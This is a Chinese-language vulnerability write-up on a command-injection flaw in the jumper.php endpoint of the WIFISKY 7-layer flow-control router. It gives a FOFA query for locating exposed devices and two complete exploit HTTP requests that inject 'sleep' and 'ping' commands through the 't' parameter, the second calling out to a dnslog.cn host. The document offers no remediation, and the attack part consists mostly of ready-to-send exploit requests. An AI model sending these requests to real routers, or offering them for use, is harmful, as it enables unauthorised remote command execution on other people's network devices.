# WIFISKY 7层流控路由器jumper存在命令执行漏洞

# 一、漏洞简介
WIFISKY-7层流控路由器是深圳市领空技术有限公司（简称“领空技术"）的一款产品，深圳市领空技术有限公司是扎根深圳辐射的网络通讯设备供应商，致力于网络通讯设备产品的研究与开发。WIFISKY 7层流控路由器 jumper 接口存在一个命令执行漏洞，使得攻击者可以通过构造特定的请求远程执行恶意代码。此漏洞可能导致攻击者获取系统权限、执行任意命令，严重威胁系统的机密性和完整性。

# 二、影响版本
+ WIFISKY-7层流控路由器

# 三、资产测绘
+ fofa`title="WIFISKY 7层流控路由器"`
+ 特征

![1715173367617-aaada69e-bcaf-4f05-8166-b5ff817cdcfe.png](./img/Oead-PjWp865K9ib/1715173367617-aaada69e-bcaf-4f05-8166-b5ff817cdcfe-078523.png)

# 四、漏洞复现
```http
GET /notice/jumper.php?t=;sleep%203 HTTP/1.1
Host: 
Cookie: SESSID=e2cc8cfb14aa1d77ffcfc93204a1d57b
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close
```

![1715173637857-4aaac66b-8ff2-4825-a42c-69652583edd7.png](./img/Oead-PjWp865K9ib/1715173637857-4aaac66b-8ff2-4825-a42c-69652583edd7-056223.png)

```http
GET /notice/jumper.php?t=;ping%20h6n6s2.dnslog.cn HTTP/1.1
Host: 
Cookie: SESSID=e2cc8cfb14aa1d77ffcfc93204a1d57b
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close
```

![1715173681881-5c92bdfd-9347-4e56-aef0-31a903b916b5.png](./img/Oead-PjWp865K9ib/1715173681881-5c92bdfd-9347-4e56-aef0-31a903b916b5-767536.png)



> 更新: 2024-05-14 11:23:44  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ged48gfhow3bphsa>